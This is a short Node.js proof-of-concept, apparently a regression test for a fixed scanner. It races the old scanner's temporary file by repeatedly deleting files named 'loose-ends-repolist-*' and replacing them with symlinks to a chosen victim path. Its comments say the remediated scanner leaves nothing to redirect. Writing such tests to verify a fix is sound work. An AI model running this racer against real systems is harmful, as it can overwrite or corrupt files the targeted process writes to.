// Target the old scanner's closed mktemp pathname. The remediated scanner has
// no named intermediate, so this same-UID racer has nothing it can redirect.
const fs = require("node:fs")
const [dir, victim] = process.argv.slice(2)
for (;;) {
  try {
    for (const name of fs.readdirSync(dir)) {
      if (!name.startsWith("loose-ends-repolist-")) continue
      const candidate = `${dir}/${name}`
      try { fs.unlinkSync(candidate) } catch {}
      try { fs.symlinkSync(victim, candidate) } catch {}
    }
  } catch {}
}
